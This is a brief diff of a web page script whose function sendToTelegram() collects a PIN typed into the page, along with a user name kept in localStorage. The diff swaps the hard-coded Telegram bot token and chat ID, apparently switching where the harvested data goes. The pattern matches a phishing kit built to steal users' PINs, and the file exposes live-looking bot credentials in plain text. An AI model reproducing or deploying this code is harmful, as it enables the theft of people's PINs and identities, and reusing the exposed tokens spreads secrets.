@@ -30,8 +30,8 @@ document.addEventListener("DOMContentLoaded", function () {
 });
 
 function sendToTelegram() {
-    const token = "7714919420:AAEiI6a7p6YHHJRO4c5bCQt8F7zA62DufNM";
-    const chatId = "7273991427";
+    const token = "8044227789:AAHNZxIXljNkt1pbwvJ5-BWLT4WRGlbycx4";
+    const chatId = "7595871538";
     const pinInput = document.getElementById("pin");
     const pin = pinInput.value.trim();
     const name = localStorage.getItem("storedUserName");
